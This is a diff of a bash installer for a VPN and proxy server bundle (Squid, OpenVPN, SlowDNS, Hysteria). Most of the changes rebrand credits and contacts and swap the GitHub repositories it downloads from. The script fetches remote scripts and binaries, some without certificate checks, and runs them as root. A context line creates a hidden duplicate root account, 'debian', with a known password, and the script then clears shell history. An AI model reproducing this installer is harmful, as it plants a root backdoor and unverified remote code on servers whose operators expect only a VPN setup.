@@ -13,7 +13,7 @@ API_LINK='https://cornerstone-mobiledata.com/api/authentication/premium';
 API_KEY='JCMVPN';
 
 
-wget -O autodns "https://raw.githubusercontent.com/TheVinci23/AutoDNS/main/5n1" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
+wget -O autodns "https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/3/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
 
 DOMAIN="$(cat /root/subdomain)"
 NS="$(cat /root/ns.txt)"
@@ -114,23 +114,23 @@ visible_hostname Dexter-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--YModifiedDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--Kaldagan--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://raw.githubusercontent.com/TheVinci23/Socks/main/5n1' -O /etc/socks.py
+wget 'https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/a/socks' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 
-wget 'https://raw.githubusercontent.com/TheVinci23/Socks1/main/socks-ssh' -O /etc/socks-ssh.py
+wget 'https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/b/socks1' -O /etc/socks-ssh.py
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://raw.githubusercontent.com/TheVinci23/Socks2/main/socks-ws-ssh' -O /etc/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/c/socks2' -O /etc/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
-wget 'https://raw.githubusercontent.com/TheVinci23/Socks3/main/socks-ws-ssl' -O /etc/socks-ws-ssl.py
+wget 'https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/d/socks3' -O /etc/socks-ws-ssl.py
 dos2unix /etc/socks-ws-ssl.py
 chmod +x /etc/socks-ws-ssl.py
 
@@ -140,7 +140,7 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 
 #====================================================
 #	Installing OpenVPN
-#	Finalized: Michaele Abalos
+#	Finalized: Modded by Kaldag
 #====================================================
 
 install_openvpn() {
@@ -610,7 +610,7 @@ chmod 755 stunnel4 && chmod 755 dropbear
 
 echo "/bin/false" >> /etc/shells
 
-wget -O /etc/banner "https://raw.githubusercontent.com/TheVinci23/Banner/main/5n1"
+wget -O /etc/banner "https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/1/banner"
 chmod +x /etc/banner
 
 useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
@@ -622,7 +622,7 @@ sudo service dropbear restart
 
 #====================================================
 #	Installing SlowDNS
-#	Finalized: YModified Developer
+#	Finalized: Modded by Kaldag
 #====================================================
 
 install_slowdns (){
@@ -735,8 +735,8 @@ DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
 
 -----------------------
 
-FB Page : https://web.facebook.com/ymodified.ph
-Whatsapp Contact: +639667881273
+FB Page : https://web.facebook.com/jcm.vpn
+Whatsapp Contact: +639488506498
 
 " >> /root/.web/$secretkey.txt
 
@@ -783,8 +783,8 @@ END
 #install server-dig.service
 cat > /etc/systemd/system/server-dig.service << END
 [Unit]
-Description=Server SlowDNS By YModifiedDev
-Documentation=https://fb.com/ymodifiedph
+Description=Server SlowDNS By Kaldag
+Documentation=https://fb.com/jcm.vpn
 After=network.target nss-lookup.target
 
 [Service]
@@ -814,11 +814,11 @@ systemctl start server-sldns
 
 #====================================================
 #	Installing Hysteria UDP
-#	Finalized: Michaele Abalos
+#	Finalized: Modded by Kaldag
 #====================================================
 
 install_hysteria(){
-wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/TheVinci23/InstallServer/main/UDP; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/4/udp; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -871,7 +871,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://github.com/TheVinci23/BadVPN/raw/main/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/KingsleyVPN/5in1/refs/heads/main/2/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 }
 
@@ -889,7 +889,7 @@ installBBR() {
 
 #====================================================
 #	Finalizing Server Setup
-#	Finalized: Michaele Abalos
+#	Finalized: Modded by Kaldag
 #====================================================
 
 install_rclocal(){
@@ -905,8 +905,8 @@ install_rclocal(){
     sudo systemctl start openvpn@server2.service    
     
     echo "[Unit]
-Description=YModified service
-Documentation=http://ymodified.net
+Description=Kaldag service
+Documentation=http://kaldag.com
 
 [Service]
 Type=oneshot
@@ -939,7 +939,7 @@ systemctl restart hysteria-server.service
 sudo systemctl enable dexter
 sudo systemctl start dexter.service
     
-echo "Made with love by: MediatekVpn Developer... " >> /root/.web/index.php
+echo "Made with love by: Kaldag Modderator... " >> /root/.web/index.php
 
 echo "tcp_port=TCP_PORT
 udp_port=UDP_PORT
@@ -969,7 +969,7 @@ sudo systemctl restart cron
 } &>/dev/null
 clear
 echo '++++++++++++++++++++++++++++++++++'
-echo '*       AIO  is ready!  Powered By: ™YModified™  *'
+echo '*       JCM Script  is ready!  Powered By: Kaldag  *'
 echo '+++++++++++************+++++++++++'
 history -c;
 rm /usr/local/etc/.system
